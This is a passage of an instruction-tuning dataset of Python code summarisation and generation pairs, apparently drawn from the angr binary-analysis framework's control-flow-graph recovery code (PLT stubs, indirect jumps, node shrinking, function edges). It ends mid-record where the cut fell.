{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndetermine if the IRSB at the given address is a PLT stub. If it is concretely execute the basic block to get the target.", "response": "def _resolve_plt(self, addr, irsb, indir_jump):\n        \"\"\"\n        Determine if the IRSB at the given address is a PLT stub. If it is, concretely execute the basic block to\n        resolve the jump target.\n\n        :param int addr:                Address of the block.\n        :param irsb:                    The basic block.\n        :param IndirectJump indir_jump: The IndirectJump instance.\n        :return:                        True if the IRSB represents a PLT stub and we successfully resolved the target.\n                                        False otherwise.\n        :rtype:                         bool\n        \"\"\"\n\n        # is the address identified by CLE as a PLT stub?\n        if self.project.loader.all_elf_objects:\n            # restrict this heuristics to ELF files only\n            if not any([ addr in obj.reverse_plt for obj in self.project.loader.all_elf_objects ]):\n                return False\n\n        # Make sure the IRSB has statements\n        if not irsb.has_statements:\n            irsb = self.project.factory.block(irsb.addr, size=irsb.size).vex\n\n        # try to resolve the jump target\n        simsucc = self.project.engines.default_engine.process(self._initial_state, irsb, force_addr=addr)\n        if len(simsucc.successors) == 1:\n            ip = simsucc.successors[0].ip\n            if ip._model_concrete is not ip:\n                target_addr = ip._model_concrete.value\n                if (self.project.loader.find_object_containing(target_addr, membership_check=False) is not\n                        self.project.loader.main_object) \\\n                        or self.project.is_hooked(target_addr):\n                    # resolved!\n                    # Fill the IndirectJump object\n                    indir_jump.resolved_targets.add(target_addr)\n                    l.debug(\"Address %#x is resolved as a PLT entry, jumping to %#x\", addr, target_addr)\n                    return True\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _indirect_jump_resolved(self, jump, jump_addr, resolved_by, targets):\n\n        from .indirect_jump_resolvers.jumptable import JumpTableResolver\n\n        source_addr = jump.addr\n\n        if isinstance(resolved_by, JumpTableResolver):\n            # Fill in the jump_tables dict\n            self.jump_tables[jump.addr] = jump\n\n        jump.resolved_targets = targets\n        all_targets = set(targets)\n        for addr in all_targets:\n            to_outside = addr in self.functions or not self._addrs_belong_to_same_section(jump.addr, addr)\n\n            # TODO: get a better estimate of the function address\n            target_func_addr = jump.func_addr if not to_outside else addr\n            func_edge = FunctionTransitionEdge(self._nodes[source_addr], addr, jump.func_addr, to_outside=to_outside,\n                                               dst_func_addr=target_func_addr\n                                               )\n            job = CFGJob(addr, target_func_addr, jump.jumpkind,\n                         last_addr=source_addr,\n                         src_node=self._nodes[source_addr],\n                         src_ins_addr=None,\n                         src_stmt_idx=None,\n                         func_edges=[func_edge],\n                         )\n            self._insert_job(job)\n            self._register_analysis_job(target_func_addr, job)\n\n        self._deregister_analysis_job(jump.func_addr, jump)\n\n        CFGBase._indirect_jump_resolved(self, jump, jump.addr, resolved_by, targets)", "response": "Called when an indirect jump is successfully resolved."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncalls when we cannot resolve an indirect jump.", "response": "def _indirect_jump_unresolved(self, jump):\n        \"\"\"\n        Called when we cannot resolve an indirect jump.\n\n        :param IndirectJump jump: The unresolved indirect jump.\n\n        :return:    None\n        \"\"\"\n\n        # add a node from this node to UnresolvableJumpTarget or UnresolvalbeCallTarget node,\n        # depending on its jump kind\n        src_node = self._nodes[jump.addr]\n        if jump.jumpkind == 'Ijk_Boring':\n            unresolvable_target_addr = self._unresolvable_jump_target_addr\n            simprocedure_name = 'UnresolvableJumpTarget'\n        elif jump.jumpkind == 'Ijk_Call':\n            unresolvable_target_addr = self._unresolvable_call_target_addr\n            simprocedure_name = 'UnresolvableCallTarget'\n        else:\n            raise AngrCFGError('It should be impossible')\n\n        dst_node = CFGNode(unresolvable_target_addr, 0, self.model,\n                           function_address=unresolvable_target_addr,\n                           simprocedure_name=simprocedure_name,\n                           block_id=unresolvable_target_addr,\n                           )\n\n        # add the dst_node to self._nodes\n        if unresolvable_target_addr not in self._nodes:\n            self._nodes[unresolvable_target_addr] = dst_node\n            self._nodes_by_addr[unresolvable_target_addr].append(dst_node)\n\n        self._graph_add_edge(dst_node, src_node, jump.jumpkind, jump.ins_addr, jump.stmt_idx)\n        # mark it as a jumpout site for that function\n        self._function_add_transition_edge(unresolvable_target_addr, src_node, jump.func_addr,\n                                           to_outside=True,\n                                           dst_func_addr=unresolvable_target_addr,\n                                           ins_addr=jump.ins_addr,\n                                           stmt_idx=jump.stmt_idx,\n                                           )\n\n        self._deregister_analysis_job(jump.func_addr, jump)\n\n        CFGBase._indirect_jump_unresolved(self, jump)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove redundant blocks that are not in the function.", "response": "def _remove_redundant_overlapping_blocks(self):\n        \"\"\"\n        On some architectures there are sometimes garbage bytes (usually nops) between functions in order to properly\n        align the succeeding function. CFGFast does a linear sweeping which might create duplicated blocks for\n        function epilogues where one block starts before the garbage bytes and the other starts after the garbage bytes.\n\n        This method enumerates all blocks and remove overlapping blocks if one of them is aligned to 0x10 and the other\n        contains only garbage bytes.\n\n        :return: None\n        \"\"\"\n\n        sorted_nodes = sorted(self.graph.nodes(), key=lambda n: n.addr if n is not None else 0)\n\n        all_plt_stub_addrs = set(itertools.chain.from_iterable(obj.reverse_plt.keys() for obj in self.project.loader.all_objects if isinstance(obj, cle.MetaELF)))\n\n        # go over the list. for each node that is the beginning of a function and is not properly aligned, if its\n        # leading instruction is a single-byte or multi-byte nop, make sure there is another CFGNode starts after the\n        # nop instruction\n\n        nodes_to_append = {}\n        # pylint:disable=too-many-nested-blocks\n        for a in sorted_nodes:\n            if a.addr in self.functions and a.addr not in all_plt_stub_addrs and \\\n                    not self._addr_hooked_or_syscall(a.addr):\n                all_in_edges = self.graph.in_edges(a, data=True)\n                if not any([data['jumpkind'] == 'Ijk_Call' for _, _, data in all_in_edges]):\n                    # no one is calling it\n                    # this function might be created from linear sweeping\n                    try:\n                        block = self._lift(a.addr, size=0x10 - (a.addr % 0x10), opt_level=1)\n                    except SimTranslationError:\n                        continue\n\n                    nop_length = None\n\n                    if self._is_noop_block(self.project.arch, block):\n                        # fast path: in most cases, the entire block is a single byte or multi-byte nop, which VEX\n                        # optimizer is able to tell\n                        nop_length = block.size\n\n                    else:\n                        # this is not a no-op block. Determine where nop instructions terminate.\n                        insns = block.capstone.insns\n                        if insns:\n                            nop_length = self._get_nop_length(insns)\n\n                    if nop_length is None or nop_length <= 0:\n                        continue\n\n                    # leading nop for alignment.\n                    next_node_addr = a.addr + nop_length\n                    if nop_length < a.size and \\\n                            not (next_node_addr in self._nodes or next_node_addr in nodes_to_append):\n                        # create a new CFGNode that starts there\n                        next_node_size = a.size - nop_length\n                        next_node = CFGNode(next_node_addr, next_node_size, self.model,\n                                            function_address=next_node_addr,\n                                            instruction_addrs=[i for i in a.instruction_addrs\n                                                                      if next_node_addr <= i\n                                                                      < next_node_addr + next_node_size\n                                                                    ],\n                                            thumb=a.thumb,\n                                            byte_string=None if a.byte_string is None else a.byte_string[nop_length:],\n                                            block_id=next_node_addr,\n                                            )\n                        self.graph.add_node(next_node)\n\n                        # create edges accordingly\n                        all_out_edges = self.graph.out_edges(a, data=True)\n                        for _, dst, data in all_out_edges:\n                            self.graph.add_edge(next_node, dst, **data)\n\n                        nodes_to_append[next_node_addr] = next_node\n\n                        # make sure there is a function begins there\n                        try:\n                            snippet = self._to_snippet(addr=next_node_addr, size=next_node_size,\n                                                       base_state=self._base_state)\n                            self.functions._add_node(next_node_addr, snippet)\n                        except (SimEngineError, SimMemoryError):\n                            continue\n\n        # append all new nodes to sorted nodes\n        if nodes_to_append:\n            sorted_nodes = sorted(sorted_nodes + list(nodes_to_append.values()), key=lambda n: n.addr if n is not None else 0)\n\n        removed_nodes = set()\n\n        a = None  # it always hold the very recent non-removed node\n\n        for i in range(len(sorted_nodes)):  # pylint:disable=consider-using-enumerate\n\n            if a is None:\n                a = sorted_nodes[0]\n                continue\n\n            b = sorted_nodes[i]\n            if self._addr_hooked_or_syscall(b.addr):\n                continue\n\n            if b in removed_nodes:\n                # skip all removed nodes\n                continue\n\n            if a.addr <= b.addr and \\\n                    (a.addr + a.size > b.addr):\n                # They are overlapping\n\n                try:\n                    block = self.project.factory.fresh_block(a.addr, b.addr - a.addr, backup_state=self._base_state)\n                except SimTranslationError:\n                    a = b\n                    continue\n                if block.capstone.insns and all([ self._is_noop_insn(insn) for insn in block.capstone.insns ]):\n                    # It's a big nop - no function starts with nop\n\n                    # add b to indices\n                    self._nodes[b.addr] = b\n                    self._nodes_by_addr[b.addr].append(b)\n\n                    # shrink a\n                    self._shrink_node(a, b.addr - a.addr, remove_function=False)\n\n                    a = b\n                    continue\n\n                all_functions = self.kb.functions\n\n                # now things are a little harder\n                # if there is no incoming edge to b, we should replace b with a\n                # this is mostly because we misidentified the function beginning. In fact a is the function beginning,\n                # but somehow we thought b is the beginning\n                if a.addr + a.size == b.addr + b.size:\n                    in_edges = len([ _ for _, _, data in self.graph.in_edges([b], data=True) ])\n                    if in_edges == 0:\n                        # we use node a to replace node b\n                        # link all successors of b to a\n                        for _, dst, data in self.graph.out_edges([b], data=True):\n                            self.graph.add_edge(a, dst, **data)\n\n                        if b.addr in self._nodes:\n                            del self._nodes[b.addr]\n                        if b.addr in self._nodes_by_addr and b in self._nodes_by_addr[b.addr]:\n                            self._nodes_by_addr[b.addr].remove(b)\n\n                        self.graph.remove_node(b)\n\n                        if b.addr in all_functions:\n                            del all_functions[b.addr]\n\n                        # skip b\n                        removed_nodes.add(b)\n\n                        continue\n\n                # next case - if b is directly from function prologue detection, or a basic block that is a successor of\n                # a wrongly identified basic block, we might be totally misdecoding b\n                if b.instruction_addrs[0] not in a.instruction_addrs:\n                    # use a, truncate b\n\n                    new_b_addr = a.addr + a.size  # b starts right after a terminates\n                    new_b_size = b.addr + b.size - new_b_addr  # this may not be the size we want, since b might be\n                                                               # misdecoded\n\n                    # totally remove b\n                    if b.addr in self._nodes:\n                        del self._nodes[b.addr]\n                    if b.addr in self._nodes_by_addr and b in self._nodes_by_addr[b.addr]:\n                        self._nodes_by_addr[b.addr].remove(b)\n\n                    self.graph.remove_node(b)\n\n                    if b.addr in all_functions:\n                        del all_functions[b.addr]\n\n                    removed_nodes.add(b)\n\n                    if new_b_size > 0:\n                        # there are still some parts left in node b - we don't want to lose it\n                        dummy_job = CFGJob(new_b_addr, a.function_address, None)\n                        self._scan_block(dummy_job)\n\n                    continue\n\n                # for other cases, we'll let them be for now\n\n            a = b"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _remove_node(self, node):\n\n        self.graph.remove_node(node)\n        if node.addr in self._nodes:\n            del self._nodes[node.addr]\n\n        # We wanna remove the function as well\n        if node.addr in self.kb.functions:\n            del self.kb.functions[node.addr]\n\n        if node.addr in self.kb.functions.callgraph:\n            self.kb.functions.callgraph.remove_node(node.addr)", "response": "Remove a CFGNode from the graph as well as from the function manager."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _shrink_node(self, node, new_size, remove_function=True):\n\n        # Generate the new node\n        new_node = CFGNode(node.addr, new_size, self.model,\n                           function_address=None if remove_function else node.function_address,\n                           instruction_addrs=[i for i in node.instruction_addrs\n                                                     if node.addr <= i < node.addr + new_size\n                                                   ],\n                           thumb=node.thumb,\n                           byte_string=None if node.byte_string is None else node.byte_string[:new_size],\n                           block_id=node.addr,\n                           )\n\n        old_in_edges = self.graph.in_edges(node, data=True)\n\n        for src, _, data in old_in_edges:\n            self.graph.add_edge(src, new_node, **data)\n\n        successor_node_addr = node.addr + new_size\n        if successor_node_addr in self._nodes:\n            successor = self._nodes[successor_node_addr]\n        else:\n            successor_size = node.size - new_size\n            successor = CFGNode(successor_node_addr, successor_size, self.model,\n                                function_address=successor_node_addr if remove_function else node.function_address,\n                                instruction_addrs=[i for i in node.instruction_addrs if i >= node.addr + new_size],\n                                thumb=node.thumb,\n                                byte_string=None if node.byte_string is None else node.byte_string[new_size:]\n                                )\n        self.graph.add_edge(new_node, successor, jumpkind='Ijk_Boring')\n\n        # if the node B already has resolved targets, we will skip all unresolvable successors when adding old out edges\n        # from node A to node B.\n        # this matters in cases where node B is resolved as a special indirect jump entry (like a PLT stub), but (node\n        # A + node B) wasn't properly resolved.\n        unresolvable_target_addrs = (self._unresolvable_jump_target_addr, self._unresolvable_call_target_addr)\n\n        has_resolved_targets = any([ node_.addr not in unresolvable_target_addrs\n                                     for node_ in self.graph.successors(successor) ]\n                                   )\n\n        old_out_edges = self.graph.out_edges(node, data=True)\n        for _, dst, data in old_out_edges:\n            if (has_resolved_targets and dst.addr not in unresolvable_target_addrs) or \\\n                    not has_resolved_targets:\n                self.graph.add_edge(successor, dst, **data)\n\n        # remove the old node from indices\n        if node.addr in self._nodes and self._nodes[node.addr] is node:\n            del self._nodes[node.addr]\n        if node.addr in self._nodes_by_addr and node in self._nodes_by_addr[node.addr]:\n            self._nodes_by_addr[node.addr].remove(node)\n\n        # remove the old node form the graph\n        self.graph.remove_node(node)\n\n        # add the new node to indices\n        self._nodes[new_node.addr] = new_node\n        self._nodes_by_addr[new_node.addr].append(new_node)\n\n        # the function starting at this point is probably totally incorrect\n        # hopefull future call to `make_functions()` will correct everything\n        if node.addr in self.kb.functions:\n            del self.kb.functions[node.addr]\n\n            if not remove_function:\n                # add functions back\n                self._function_add_node(node, node.addr)\n                successor_node = self.model.get_any_node(successor_node_addr)\n                if successor_node and successor_node.function_address == node.addr:\n                    # if there is absolutely no predecessors to successor_node, we'd like to add it as a new function\n                    # so that it will not be left behind\n                    if not list(self.graph.predecessors(successor_node)):\n                        self._function_add_node(successor_node, successor_node_addr)", "response": "Shrinks the size of a basic block."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nanalyze all functions and update their returning attribute.", "response": "def _analyze_all_function_features(self, all_funcs_completed=False):\n        \"\"\"\n        Iteratively analyze all changed functions, update their returning attribute, until a fix-point is reached (i.e.\n        no new returning/not-returning functions are found).\n\n        :return: None\n        \"\"\"\n\n        while True:\n            new_changes = self._iteratively_analyze_function_features(all_funcs_completed=all_funcs_completed)\n            new_returning_functions = new_changes['functions_return']\n            new_not_returning_functions = new_changes['functions_do_not_return']\n\n            if not new_returning_functions and not new_not_returning_functions:\n                break\n\n            for returning_function in new_returning_functions:\n                self._pending_jobs.add_returning_function(returning_function.addr)\n                if returning_function.addr in self._function_returns:\n                    for fr in self._function_returns[returning_function.addr]:\n                        # Confirm them all\n                        if not self.kb.functions.contains_addr(fr.caller_func_addr):\n                            # FIXME: A potential bug might arise here. After post processing (phase 2), if the function\n                            # specified by fr.caller_func_addr has been merged to another function during phase 2, we\n                            # will simply skip this FunctionReturn here. It might lead to unconfirmed fake_ret edges\n                            # in the newly merged function. Fix this bug in the future when it becomes an issue.\n                            continue\n\n                        if self.kb.functions.get_by_addr(fr.caller_func_addr).returning is not True:\n                            self._updated_nonreturning_functions.add(fr.caller_func_addr)\n\n                        return_to_node = self._nodes.get(fr.return_to, None)\n                        if return_to_node is None:\n                            return_to_snippet = self._to_snippet(addr=fr.return_to, base_state=self._base_state)\n                        else:\n                            return_to_snippet = self._to_snippet(cfg_node=self._nodes[fr.return_to])\n\n                        self.kb.functions._add_return_from_call(fr.caller_func_addr, fr.callee_func_addr,\n                                                                return_to_snippet)\n\n                    del self._function_returns[returning_function.addr]\n\n            for nonreturning_function in new_not_returning_functions:\n                self._pending_jobs.add_nonreturning_function(nonreturning_function.addr)\n                if nonreturning_function.addr in self._function_returns:\n                    for fr in self._function_returns[nonreturning_function.addr]:\n                        # Remove all those FakeRet edges\n                        if self.kb.functions.contains_addr(fr.caller_func_addr) and \\\n                                self.kb.functions.get_by_addr(fr.caller_func_addr).returning is not True:\n                            self._updated_nonreturning_functions.add(fr.caller_func_addr)\n\n                    del self._function_returns[nonreturning_function.addr]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd edge between nodes or add node if entry point is not jumped from None.", "response": "def _graph_add_edge(self, cfg_node, src_node, src_jumpkind, src_ins_addr, src_stmt_idx):\n        \"\"\"\n        Add edge between nodes, or add node if entry point\n\n        :param CFGNode cfg_node: node which is jumped to\n        :param CFGNode src_node: node which is jumped from none if entry point\n        :param str src_jumpkind: what type of jump the edge takes\n        :param int or str src_stmt_idx: source statements ID\n        :return: None\n        \"\"\"\n\n        if src_node is None:\n            self.graph.add_node(cfg_node)\n        else:\n            self.graph.add_edge(src_node, cfg_node, jumpkind=src_jumpkind, ins_addr=src_ins_addr,\n                                stmt_idx=src_stmt_idx)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _make_return_edges(self):\n\n        for func_addr, func in self.functions.items():\n            if func.returning is False:\n                continue\n\n            # get the node on CFG\n            if func.startpoint is None:\n                l.warning('Function %#x does not have a startpoint (yet).', func_addr)\n                continue\n\n            startpoint = self.model.get_any_node(func.startpoint.addr)\n            if startpoint is None:\n                # weird...\n                l.warning('No CFGNode is found for function %#x in _make_return_edges().', func_addr)\n                continue\n\n            endpoints = self._get_return_sources(func)\n\n            # get all callers\n            callers = self.model.get_predecessors(startpoint, jumpkind='Ijk_Call')\n            # for each caller, since they all end with a call instruction, get the immediate successor\n            return_targets = itertools.chain.from_iterable(\n                self.model.get_successors(caller, excluding_fakeret=False, jumpkind='Ijk_FakeRet') for caller in callers\n            )\n            return_targets = set(return_targets)\n\n            for ep in endpoints:\n                src = self.model.get_any_node(ep.addr)\n                for rt in return_targets:\n                    if not src.instruction_addrs:\n                        ins_addr = None\n                    else:\n                        if self.project.arch.branch_delay_slot:\n                            if len(src.instruction_addrs) > 1:\n                                ins_addr = src.instruction_addrs[-2]\n                            else:\n                                l.error('At %s: expecting more than one instruction. Only got one.', src)\n                                ins_addr = None\n                        else:\n                            ins_addr = src.instruction_addrs[-1]\n\n                    self._graph_add_edge(rt, src, 'Ijk_Ret', ins_addr, DEFAULT_STATEMENT)", "response": "Create edges for each returning function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd a node to the function manager", "response": "def _function_add_node(self, cfg_node, function_addr):\n        \"\"\"\n        Adds node to function manager, converting address to CodeNode if\n        possible\n\n        :param CFGNode cfg_node:    A CFGNode instance.\n        :param int function_addr:   Address of the current function.\n        :return: None\n        \"\"\"\n        snippet = self._to_snippet(cfg_node=cfg_node)\n        self.kb.functions._add_node(function_addr, snippet)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _function_add_transition_edge(self, dst_addr, src_node, src_func_addr, to_outside=False, dst_func_addr=None,\n                                      stmt_idx=None, ins_addr=None):\n        \"\"\"\n        Add a transition edge to the function transiton map.\n\n        :param int dst_addr: Address that the control flow transits to.\n        :param CFGNode src_node: The source node that the control flow transits from.\n        :param int src_func_addr: Function address.\n        :return: True if the edge is correctly added. False if any exception occurred (for example, the target address\n                 does not exist)\n        :rtype: bool\n        \"\"\"\n\n        try:\n            target_node = self._nodes.get(dst_addr, None)\n            if target_node is None:\n                target_snippet = self._to_snippet(addr=dst_addr, base_state=self._base_state)\n            else:\n                target_snippet = self._to_snippet(cfg_node=target_node)\n\n            if src_node is None:\n                # Add this basic block into the function manager\n                self.kb.functions._add_node(src_func_addr, target_snippet)\n            else:\n                src_snippet = self._to_snippet(cfg_node=src_node)\n                if not to_outside:\n                    self.kb.functions._add_transition_to(src_func_addr, src_snippet, target_snippet, stmt_idx=stmt_idx,\n                                                         ins_addr=ins_addr\n                                                         )\n                else:\n                    self.kb.functions._add_outside_transition_to(src_func_addr, src_snippet, target_snippet,\n                                                                 to_function_addr=dst_func_addr,\n                                                                 stmt_idx=stmt_idx, ins_addr=ins_addr\n                                                                 )\n            return True\n        except (SimMemoryError, SimEngineError):\n            return False", "response": "Add a transition edge to the function transiton map."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _function_add_call_edge(self, addr, src_node, function_addr, syscall=False, stmt_idx=None, ins_addr=None):\n        try:\n            if src_node is None:\n                self.kb.functions._add_node(function_addr, addr, syscall=syscall)\n            else:\n                src_snippet = self._to_snippet(cfg_node=src_node)\n\n                return_to_outside = False\n\n                ret_snippet = None\n\n                self.kb.functions._add_call_to(function_addr, src_snippet, addr, ret_snippet, syscall=syscall,\n                                               stmt_idx=stmt_idx, ins_addr=ins_addr,\n                                               return_to_outside=return_to_outside,\n                                               )\n            return True\n        except (SimMemoryError, SimEngineError):\n            return False", "response": "Adds a call edge to the function transition map."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _function_add_fakeret_edge(self, addr, src_node, src_func_addr, confirmed=None):\n\n        target_node = self._nodes.get(addr, None)\n        if target_node is None:\n            target_snippet = self._to_snippet(addr=addr, base_state=self._base_state)\n        else:\n            target_snippet = self._to_snippet(cfg_node=target_node)\n\n        if src_node is None:\n            self.kb.functions._add_node(src_func_addr, target_snippet)\n        else:\n            src_snippet = self._to_snippet(cfg_node=src_node)\n            self.kb.functions._add_fakeret_to(src_func_addr, src_snippet, target_snippet, confirmed=confirmed)", "response": "Generate CodeNodes for target and source node add node to function manager"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _function_add_return_site(self, addr, function_addr):\n        try:\n            target = self._to_snippet(self._nodes[addr])\n        except KeyError:\n            target = addr\n\n        self.kb.functions._add_return_from(function_addr, target)", "response": "Generate CodeNodes for target address registers node for function to\n        function manager as return site"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _function_add_return_edge(self, return_from_addr, return_to_addr, function_addr):\n\n        return_to_node = self._nodes.get(return_to_addr, None)\n        if return_to_node is None:\n            return_to_snippet = self._to_snippet(addr=return_to_addr, base_state=self._base_state)\n            to_outside = False\n        else:\n            return_to_snippet = self._to_snippet(cfg_node=return_to_node)\n            to_outside = return_to_node.function_address != function_addr\n\n        self.kb.functions._add_return_from_call(function_addr, return_from_addr, return_to_snippet,\n                                                to_outside=to_outside)", "response": "Add a return edge to the function manager"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _arm_track_lr_on_stack(self, addr, irsb, function):\n\n        if irsb.statements is None:\n            return\n\n        if 'lr_saved_on_stack' in function.info:\n            return\n\n        # if it does, we log it down to the Function object.\n        lr_offset = self.project.arch.registers['lr'][0]\n        sp_offset = self.project.arch.sp_offset\n        initial_sp = 0x7fff0000\n        initial_lr = 0xabcdef\n        tmps = {}\n\n        # pylint:disable=too-many-nested-blocks\n        for stmt in irsb.statements:\n            if isinstance(stmt, pyvex.IRStmt.IMark):\n                if stmt.addr + stmt.delta != addr:\n                    break\n            elif isinstance(stmt, pyvex.IRStmt.WrTmp):\n                data = stmt.data\n                if isinstance(data, pyvex.IRExpr.Get):\n                    if data.offset == sp_offset:\n                        tmps[stmt.tmp] = initial_sp\n                    elif data.offset == lr_offset:\n                        tmps[stmt.tmp] = initial_lr\n                elif isinstance(data, pyvex.IRExpr.Binop):\n                    if data.op == 'Iop_Sub32':\n                        arg0, arg1 = data.args\n                        if isinstance(arg0, pyvex.IRExpr.RdTmp) and isinstance(arg1, pyvex.IRExpr.Const):\n                            if arg0.tmp in tmps:\n                                tmps[stmt.tmp] = tmps[arg0.tmp] - arg1.con.value\n\n            elif isinstance(stmt, (pyvex.IRStmt.Store, pyvex.IRStmt.StoreG)):\n                data = stmt.data\n                storing_lr = False\n                if isinstance(data, pyvex.IRExpr.RdTmp):\n                    if data.tmp in tmps:\n                        val = tmps[data.tmp]\n                        if val == initial_lr:\n                            # we are storing LR to somewhere\n                            storing_lr = True\n                if storing_lr:\n                    if isinstance(stmt.addr, pyvex.IRExpr.RdTmp):\n                        if stmt.addr.tmp in tmps:\n                            storing_addr = tmps[stmt.addr.tmp]\n\n                            function.info['lr_saved_on_stack'] = True\n                            function.info['lr_on_stack_offset'] = storing_addr - initial_sp\n                            break\n\n        if 'lr_saved_on_stack' not in function.info:\n            function.info['lr_saved_on_stack'] = False", "response": "This method is used to track the LR register on the stack."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsimulates the read from the stack and return the jumpkind of the last instruction.", "response": "def _arm_track_read_lr_from_stack(self, irsb, function):  # pylint:disable=unused-argument\n        \"\"\"\n        At the end of a basic block, simulate the very last instruction to see if the return address is read from the\n        stack and written in PC. If so, the jumpkind of this IRSB will be set to Ijk_Ret. For detailed explanations,\n        please see the documentation of _arm_track_lr_on_stack().\n\n        :param pyvex.IRSB irsb: The basic block object.\n        :param Function function: The function instance.\n        :return: None\n        \"\"\"\n\n        if 'lr_saved_on_stack' not in function.info or not function.info['lr_saved_on_stack']:\n            return\n\n        sp_offset = self.project.arch.sp_offset\n        initial_sp = 0x7fff0000\n        last_sp = None\n        tmps = {}\n        tmp_irsb = self._lift(irsb.instruction_addresses[-1], opt_level=self._iropt_level).vex\n        # pylint:disable=too-many-nested-blocks\n        for stmt in tmp_irsb.statements:\n            if isinstance(stmt, pyvex.IRStmt.WrTmp):\n                data = stmt.data\n                if isinstance(data, pyvex.IRExpr.Get) and data.offset == sp_offset:\n                    # t0 = GET:I32(sp)\n                    tmps[stmt.tmp] = initial_sp\n                elif isinstance(data, pyvex.IRExpr.Binop):\n                    # only support Add\n                    if data.op == 'Iop_Add32':\n                        arg0, arg1 = data.args\n                        if isinstance(arg0, pyvex.IRExpr.RdTmp) and isinstance(arg1, pyvex.IRExpr.Const):\n                            if arg0.tmp in tmps:\n                                tmps[stmt.tmp] = tmps[arg0.tmp] + arg1.con.value\n                elif isinstance(data, pyvex.IRExpr.Load):\n                    if isinstance(data.addr, pyvex.IRExpr.RdTmp):\n                        if data.addr.tmp in tmps:\n                            tmps[stmt.tmp] = ('load', tmps[data.addr.tmp])\n            elif isinstance(stmt, pyvex.IRStmt.Put):\n                if stmt.offset == sp_offset and isinstance(stmt.data, pyvex.IRExpr.RdTmp):\n                    if stmt.data.tmp in tmps:\n                        # loading things into sp\n                        last_sp = tmps[stmt.data.tmp]\n\n        if last_sp is not None and isinstance(tmp_irsb.next, pyvex.IRExpr.RdTmp):\n            val = tmps.get(tmp_irsb.next.tmp, None)\n            # val being None means there are statements that we do not handle\n            if isinstance(val, tuple) and val[0] == 'load':\n                # the value comes from memory\n                memory_addr = val[1]\n                if isinstance(last_sp, int):\n                    lr_on_stack_offset = memory_addr - last_sp\n                else:\n                    lr_on_stack_offset = memory_addr - last_sp[1]\n\n                if lr_on_stack_offset == function.info['lr_on_stack_offset']:\n                    # the jumpkind should be Ret instead of boring\n                    irsb.jumpkind = 'Ijk_Ret'"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates a CFGNode that starts at cfg_job. addr.", "response": "def _generate_cfgnode(self, cfg_job, current_function_addr):\n        \"\"\"\n        Generate a CFGNode that starts at `cfg_job.addr`.\n\n        Since lifting machine code to IRSBs is slow, self._nodes is used as a cache of CFGNodes.\n\n        If the current architecture is ARM, this method will try to lift the block in the mode specified by the address\n        (determined by the parity of the address: even for ARM, odd for THUMB), and in case of decoding failures, try\n        the other mode. If the basic block is successfully decoded in the other mode (different from the initial one),\n         `addr` and `current_function_addr` are updated.\n\n        :param CFGJob cfg_job: The CFGJob instance.\n        :param int current_function_addr: Address of the current function.\n        :return: A 4-tuple of (new address, new function address, CFGNode instance, IRSB object)\n        :rtype: tuple\n        \"\"\"\n\n        addr = cfg_job.addr\n\n        try:\n\n            if addr in self._nodes:\n                cfg_node = self._nodes[addr]\n                irsb = cfg_node.irsb\n\n                if cfg_node.function_address != current_function_addr:\n                    # the node has been assigned to another function before.\n                    # we should update the function address.\n                    current_function_addr = cfg_node.function_address\n\n                return addr, current_function_addr, cfg_node, irsb\n\n            is_x86_x64_arch = self.project.arch.name in ('X86', 'AMD64')\n\n            if is_arm_arch(self.project.arch):\n                real_addr = addr & (~1)\n            else:\n                real_addr = addr\n\n            # if possible, check the distance between `addr` and the end of this section\n            distance = VEX_IRSB_MAX_SIZE\n            obj = self.project.loader.find_object_containing(addr, membership_check=False)\n            if obj:\n                # is there a section?\n                has_executable_section = len([ sec for sec in obj.sections if sec.is_executable ]) > 0  # pylint:disable=len-as-condition\n                section = self.project.loader.find_section_containing(addr)\n                if has_executable_section and section is None:\n                    # the basic block should not exist here...\n                    return None, None, None, None\n                if section is not None:\n                    if not section.is_executable:\n                        # the section is not executable...\n                        return None, None, None, None\n                    distance = section.vaddr + section.memsize - real_addr\n                    distance = min(distance, VEX_IRSB_MAX_SIZE)\n                # TODO: handle segment information as well\n\n            # also check the distance between `addr` and the closest function.\n            # we don't want to have a basic block that spans across function boundaries\n            next_func = self.functions.ceiling_func(addr + 1)\n            if next_func is not None:\n                distance_to_func = (next_func.addr & (~1) if is_arm_arch(self.project.arch) else next_func.addr) - real_addr\n                if distance_to_func != 0:\n                    if distance is None:\n                        distance = distance_to_func\n                    else:\n                        distance = min(distance, distance_to_func)\n\n            # in the end, check the distance between `addr` and the closest occupied region in segment list\n            next_noncode_addr = self._seg_list.next_pos_with_sort_not_in(addr, { \"code\" }, max_distance=distance)\n            if next_noncode_addr is not None:\n                distance_to_noncode_addr = next_noncode_addr - addr\n                distance = min(distance, distance_to_noncode_addr)\n\n            # Let's try to create the pyvex IRSB directly, since it's much faster\n            nodecode = False\n            irsb = None\n            irsb_string = None\n            try:\n                lifted_block = self._lift(addr, size=distance, opt_level=self._iropt_level, collect_data_refs=True)\n                irsb = lifted_block.vex_nostmt\n                irsb_string = lifted_block.bytes[:irsb.size]\n            except SimTranslationError:\n                nodecode = True\n\n            if (nodecode or irsb.size == 0 or irsb.jumpkind == 'Ijk_NoDecode') and \\\n                    is_arm_arch(self.project.arch) and \\\n                    self._arch_options.switch_mode_on_nodecode:\n                # maybe the current mode is 